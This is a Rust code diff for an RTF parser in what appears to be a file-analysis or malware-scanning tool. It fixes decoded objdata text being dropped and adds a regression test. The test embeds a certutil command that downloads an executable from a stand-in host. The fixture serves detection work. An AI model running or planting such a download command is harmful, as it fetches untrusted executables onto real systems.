@@ -36,7 +36,9 @@ use crate::metric;
 use serde_json::{Value as JsonValue, json};
 
 use crate::error::Error;
-use crate::formats::common::{XorScan, extract_binary_strings, hex_nibble, put_str};
+use crate::formats::common::{
+    XorScan, append_decoded_strings, extract_binary_strings, hex_nibble, put_str,
+};
 use crate::output::{Metrics, Strings, Values};
 
 pub(super) fn extract(
@@ -417,7 +419,7 @@ fn objdata_objects(bytes: &[u8], strings: &mut Strings, metrics: &mut Metrics) -
         // the command only exists once they are paired up. The same is true of
         // an embedded compound file: whatever it holds is invisible until the
         // blob is decoded.
-        extract_binary_strings(&decoded, strings, XorScan::No);
+        append_decoded_strings(&decoded, strings, XorScan::No);
         if let Some(entry) = ole1_header(&decoded) {
             out.push(entry);
         }
@@ -884,6 +886,37 @@ mod tests {
         let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
         assert_eq!(objects.len(), 1);
         assert_eq!(objects[0]["class"].as_str(), Some("Equation.3"));
+    }
+
+    #[test]
+    fn decoded_objdata_text_is_added_to_the_file_s_own_strings() {
+        // The regression this guards: extract_binary_strings *replaces*
+        // strings.text, so extracting the decoded blob a second time through
+        // it silently discarded every string the RTF itself carried.
+        let command = b"cmd /c certutil -urlcache -f http://example.test/a.exe";
+        let rtf = objdata_rtf("Package", command);
+        let (_, _) = extract_rtf(&rtf);
+
+        let mut values = Values::default();
+        let mut strings = Strings::default();
+        let mut metrics = Metrics::default();
+        extract(&rtf, &mut values, &mut strings, &mut metrics).unwrap();
+        let all: Vec<&str> = strings
+            .text
+            .rows()
+            .iter()
+            .map(|r| r.value.as_str())
+            .collect();
+        // The decoded command, which appears nowhere in the file's bytes.
+        assert!(
+            all.iter().any(|v| v.contains("certutil")),
+            "decoded objdata text missing: {all:?}"
+        );
+        // And the document's own text, which the replacing call threw away.
+        assert!(
+            all.iter().any(|v| v.contains("objdata")),
+            "file's own strings were discarded: {all:?}"
+        );
     }
 
     #[test]
